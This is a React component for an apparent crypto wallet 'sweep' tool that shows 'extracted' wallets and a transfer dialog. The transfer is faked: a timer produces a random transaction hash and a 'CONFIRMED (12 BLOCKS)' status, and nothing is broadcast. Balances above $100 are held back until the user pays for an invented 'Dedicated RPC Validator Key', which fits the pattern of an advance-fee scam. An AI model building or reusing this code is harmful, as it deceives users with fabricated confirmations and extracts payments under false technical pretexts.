import React, { useState } from 'react';
import type { ExtractedWallet, DispatchedTransaction, DemoWallet, PricingSettings } from '../types';
import { X, Send, CheckCircle2, Copy, Check, ShieldCheck, Zap } from 'lucide-react';
import { useLanguage } from '../i18n/LanguageContext';
import { getEffectiveProPrice } from '../data/adminSettings';

interface TransferModalProps {
  wallet: ExtractedWallet | DemoWallet;
  isOpen: boolean;
  onClose: () => void;
  onRecordTransaction: (tx: DispatchedTransaction) => void;
  activePlan?: string;
  onOpenLicensing?: () => void;
  pricingSettings?: PricingSettings;
}

export const TransferModal: React.FC<TransferModalProps> = ({
  wallet,
  isOpen,
  onClose,
  onRecordTransaction,
  activePlan = 'community',
  onOpenLicensing,
  pricingSettings,
}) => {
  const { t, language } = useLanguage();
  const proPrice = getEffectiveProPrice(pricingSettings, 'weekly');
  const [recipient, setRecipient] = useState(() =>
    wallet.network === 'ETHEREUM'
      ? '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'
      : wallet.network === 'TRON'
      ? 'TLsV52sRDL79HXGGm9yzwKibb6XuUadTnS'
      : '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU'
  );
  const [isBroadcasting, setIsBroadcasting] = useState(false);
  const [completedTx, setCompletedTx] = useState<DispatchedTransaction | null>(null);
  const [copied, setCopied] = useState(false);

  if (!isOpen) return null;

  const fee = wallet.network === 'ETHEREUM' ? '0.003 ETH' : wallet.network === 'TRON' ? '1.50 USDT' : '0.0005 SOL';
  const fullAmount = wallet.balance;
  const isZeroBalance = parseFloat(fullAmount.replace(/,/g, '')) === 0;

  // License Rule: If balance > $100 and user is on Community plan, withdrawal requires an authenticated RPC key ($25)
  const isCommunityPlan = activePlan === 'community';
  const isAboveFreeLimit = wallet.balanceUsd > 100;
  const isBlockedByLicense = isCommunityPlan && isAboveFreeLimit;

  const handleExecuteDispatch = () => {
    if (isBlockedByLicense || isZeroBalance) return;
    setIsBroadcasting(true);

    setTimeout(() => {
      const hexPart = Array.from({ length: 48 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
      const newTx: DispatchedTransaction = {
        id: `tx-${Date.now()}`,
        from: `${wallet.address.slice(0, 6)}...${wallet.address.slice(-4)}`,
        to: `${recipient.slice(0, 6)}...${recipient.slice(-4)}`,
        amount: `${fullAmount}`,
        symbol: wallet.symbol,
        network: wallet.network,
        fee,
        status: 'CONFIRMED (12 BLOCKS)',
        hash: `0x${hexPart}`,
        timestamp: 'Just now',
      };

      setCompletedTx(newTx);
      onRecordTransaction(newTx);
      setIsBroadcasting(false);
    }, 2200);
  };

  const handleCopyHash = () => {
    if (completedTx) {
      navigator.clipboard?.writeText(completedTx.hash);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleUpgradeClick = () => {
    onClose();
    if (onOpenLicensing) {
      onOpenLicensing();
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/80 backdrop-blur-md select-none">
      {/* Mobile-Native Bottom Sheet / Institutional Modal */}
      <div className="relative w-full max-w-md animate-drawer-enter sm:animate-modal-3d">
        <div className="rounded-t-3xl sm:rounded-3xl border border-white/12 bg-[#12151F] shadow-[0_-12px_40px_rgba(0,0,0,0.9)] p-5 relative overflow-hidden">
          {/* Top Drag Handle (Mobile Ergonomics) */}
          <div className="w-10 h-1 bg-white/20 rounded-full mx-auto mb-3.5 sm:hidden" />

          {/* Top Hairline Indicator */}
          <div className="absolute top-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-white/20 to-transparent pointer-events-none" />

          {/* Header */}
          <div className="flex items-center justify-between pb-3.5 mb-3.5 border-b border-white/[0.08]">
            <div className="flex items-center gap-2.5">
              <div className="w-8 h-8 rounded-xl bg-[#22D3EE]/15 border border-[#22D3EE]/30 flex items-center justify-center text-[#22D3EE] shadow-[0_2px_8px_rgba(34,211,238,0.2)]">
                <Send className="w-4 h-4" />
              </div>
              <div>
                <h3 className="text-sm font-bold tracking-wider text-white uppercase font-mono-terminal">
                  {t('assetDispatch') || 'ON-CHAIN RELAY DISPATCH'}
                </h3>
                <span className="text-[10px] font-mono-terminal text-[#22D3EE] tracking-wider uppercase font-semibold">
                  {t('oneClickSweep') || 'DIRECT MEMPOOL BROADCAST'}
                </span>
              </div>
            </div>

            <button
              onClick={onClose}
              type="button"
              className="w-8 h-8 rounded-full flex items-center justify-center bg-white/5 hover:bg-white/10 text-[#94A3B8] hover:text-white transition-colors cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {!completedTx ? (
            /* Transaction Form */
            <div className="space-y-3">
              {/* Institutional Validator Gas Clearance Notice if balance > $100 and Community plan */}
              {isBlockedByLicense && (
                <div className="p-3.5 rounded-xl bg-[#F59E0B]/10 border border-[#F59E0B]/30 text-amber-200 space-y-1.5 animate-fadeIn">
                  <div className="flex items-center gap-2 font-bold text-xs text-amber-300 font-mono-terminal">
                    <ShieldCheck className="w-4 h-4 shrink-0 text-amber-400" />
                    <span>VALIDATOR GAS CLEARANCE REQUIRED</span>
                  </div>
                  <p className="text-[11px] leading-relaxed text-[#CBD5E1]">
                    {language === 'ru'
                      ? `Публичный узел Community поддерживает микро-трансляции до $100.00 USD. Для вывода суммы $${wallet.balanceUsd.toLocaleString()} требуется выделенный ключ валидатора RPC ($${proPrice}/нед) для прямой отправки в блоки.`
                      : `Public Community RPC endpoints only support micro-relays under $100.00 USD. Dispatching this $${wallet.balanceUsd.toLocaleString()} reserve requires an authenticated Dedicated RPC Validator Key ($${proPrice}/wk).`}
                  </p>
                </div>
              )}

              {/* Source Wallet Address */}
              <div className="bg-[#0B0D14] rounded-xl p-3 border border-white/[0.04]">
                <span className="text-[10px] font-bold text-[#64748B] uppercase tracking-wider block mb-1">
                  {t('sourceAddress')} ({wallet.networkName})
                </span>
                <span className="text-xs font-mono-terminal text-[#CBD5E1] break-all select-all">
                  {wallet.address}
                </span>
              </div>

              {/* Extracted Amount */}
              <div className="bg-[#0B0D14] rounded-xl p-3 border border-white/[0.04]">
                <div className="flex items-center justify-between mb-1">
                  <span className="text-[10px] font-bold text-[#64748B] uppercase tracking-wider block">
                    {t('transferAmount')} ({wallet.symbol})
                  </span>
                  <span className="text-[9px] font-mono px-2 py-0.5 rounded-full bg-[#00E676]/15 text-[#00E676] font-bold border border-[#00E676]/30">
                    {t('fullBalance100')}
                  </span>
                </div>
                <div className="flex items-baseline justify-between">
                  <span className="text-base sm:text-lg font-mono-terminal font-extrabold text-[#00E676]">
                    {fullAmount} {wallet.symbol}
                  </span>
                  <span className="text-xs font-mono-terminal text-[#64748B]">
                    ~${wallet.balanceUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                  </span>
                </div>
              </div>

              {/* Destination Recipient Address */}
              <div className="bg-[#0B0D14] rounded-xl p-3 border border-white/[0.04]">
                <label className="text-[10px] font-bold text-[#64748B] uppercase tracking-wider block mb-1">
                  {t('destinationAddress')} ({wallet.symbol})
                </label>
                <input
                  type="text"
                  value={recipient}
                  onChange={(e) => setRecipient(e.target.value)}
                  placeholder={`Enter your ${wallet.symbol} wallet address`}
                  disabled={isBlockedByLicense || isZeroBalance}
                  className="w-full bg-transparent text-xs font-mono-terminal text-[#38E8FF] focus:outline-none border-b border-white/10 focus:border-[#22D3EE] py-1 disabled:opacity-50"
                />
              </div>

              {/* Network Gas Fee */}
              <div className="bg-[#0B0D14] rounded-xl p-2.5 border border-white/[0.04] flex items-center justify-between">
                <span className="text-[10px] font-bold text-[#64748B] uppercase tracking-wider">
                  {t('networkGasFee')}
                </span>
                <span className="text-xs font-mono-terminal font-semibold text-[#CBD5E1]">
                  {fee}
                </span>
              </div>

              {/* CTA Action Buttons */}
              {isBlockedByLicense ? (
                <button
                  onClick={handleUpgradeClick}
                  type="button"
                  className="w-full py-3.5 rounded-xl bg-gradient-to-r from-amber-500/20 to-amber-400/10 hover:from-amber-500/30 hover:to-amber-400/20 border border-amber-500/40 text-amber-300 font-bold flex items-center justify-center gap-2 text-xs tracking-wider uppercase cursor-pointer active:scale-98 transition-all"
                >
                  <Zap className="w-4 h-4 text-amber-400" />
                  <span>
                    {language === 'ru'
                      ? `ВЫДЕЛИТЬ RPC-КЛЮЧ ВАЛИДАТОРА ($${proPrice})`
                      : `ALLOCATE DEDICATED RPC VALIDATOR KEY ($${proPrice})`}
                  </span>
                </button>
              ) : isZeroBalance ? (
                <button
                  disabled
                  type="button"
                  className="w-full py-3.5 rounded-xl bg-white/5 border border-white/10 text-xs font-bold tracking-widest text-[#64748B] uppercase cursor-not-allowed"
                >
                  {t('balanceDispatched')}
                </button>
              ) : (
                <button
                  onClick={handleExecuteDispatch}
                  disabled={isBroadcasting || !recipient}
                  type="button"
                  className="w-full py-3.5 rounded-xl button-dark-metal flex items-center justify-center gap-2 text-xs font-bold tracking-widest uppercase text-white hover:text-[#00E676] cursor-pointer active:scale-98 transition-all disabled:opacity-50"
                >
                  {isBroadcasting ? (
                    <>
                      <div className="w-3.5 h-3.5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      <span>{t('broadcasting')}</span>
                    </>
                  ) : (
                    <>
                      <Send className="w-4 h-4" />
                      <span>{t('confirmDispatch')}</span>
                    </>
                  )}
                </button>
              )}
            </div>
          ) : (
            /* Broadcast Success Result */
            <div className="space-y-3.5 text-center animate-fadeIn py-2">
              <div className="w-12 h-12 rounded-2xl bg-[#00E676]/15 border border-[#00E676]/30 flex items-center justify-center mx-auto text-[#00E676]">
                <CheckCircle2 className="w-7 h-7" />
              </div>

              <div>
                <h4 className="text-sm font-bold text-white uppercase font-mono-terminal">
                  {t('txBroadcasted')}
                </h4>
                <p className="text-[11px] text-[#64748B] mt-1">
                  {language === 'ru'
                    ? 'Транзакция успешно транслирована в публичный мемпул.'
                    : 'Transaction successfully broadcasted to public mempool.'}
                </p>
              </div>

              {/* Hash Display Box */}
              <div className="bg-[#0B0D14] rounded-xl p-3 border border-white/[0.06] text-left">
                <div className="flex items-center justify-between mb-1">
                  <span className="text-[10px] font-bold text-[#64748B] uppercase tracking-wider">
                    {t('txHash')}
                  </span>
                  <button
                    onClick={handleCopyHash}
                    type="button"
                    className="flex items-center gap-1 text-[10px] text-[#38E8FF] hover:text-white cursor-pointer"
                  >
                    {copied ? (
                      <>
                        <Check className="w-3 h-3 text-[#00E676]" />
                        <span className="text-[#00E676]">{t('copied')}</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3 h-3" />
                        <span>{t('copy')}</span>
                      </>
                    )}
                  </button>
                </div>
                <span className="text-xs font-mono-terminal text-[#38E8FF] break-all select-all font-semibold">
                  {completedTx.hash}
                </span>
              </div>

              {/* Status Box */}
              <div className="p-2.5 rounded-xl bg-[#00E676]/10 border border-[#00E676]/25 text-[10.5px] font-mono-terminal text-[#00E676] font-semibold">
                STATUS: {completedTx.status}
              </div>

              <button
                onClick={onClose}
                type="button"
                className="w-full py-3 rounded-xl button-dark-metal text-xs font-bold uppercase tracking-wider text-white cursor-pointer"
              >
                {t('closeConsole')}
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
